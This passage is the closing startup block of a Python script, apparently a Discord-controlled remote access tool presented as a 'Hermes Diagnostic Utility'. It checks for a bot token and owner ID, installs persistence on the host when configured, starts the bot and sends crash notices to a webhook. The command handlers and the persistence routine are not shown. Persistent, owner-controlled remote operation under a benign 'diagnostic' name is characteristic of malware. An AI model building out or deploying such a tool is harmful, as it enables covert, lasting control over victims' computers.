    if BOT_TOKEN == "YOUR_TOKEN_HERE":
        print("[HDUTIL]  ERROR: Set BOT_TOKEN in the configuration section.")
        print("          Get one at: https://discord.com/developers/applications")
        sys.exit(1)
    if OWNER_ID == 0:
        print("[HDUTIL]  ERROR: Set OWNER_ID to your Discord user ID.")
        print("          (Enable Developer Mode → right-click your name → Copy ID)")
        sys.exit(1)

    # Install persistence if configured
    if INSTALL_DIR:
        install_persistence()

    print("[HDUTIL]  Starting Hermes Diagnostic Utility v3.1 \u2026")
    print(f"          Prefix: {CMD_PREFIX}  |  Owner: {OWNER_ID}")

    try:
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        print("[HDUTIL]  ERROR: Invalid bot token. Check BOT_TOKEN.")
        send_webhook("\u26a0\ufe0f HDUTIL failed to start: invalid token.")
        sys.exit(1)
    except Exception as e:
        print(f"[HDUTIL]  Fatal: {e}")
        send_webhook(f"\u26a0\ufe0f HDUTIL crashed: {e}")
        sys.exit(1)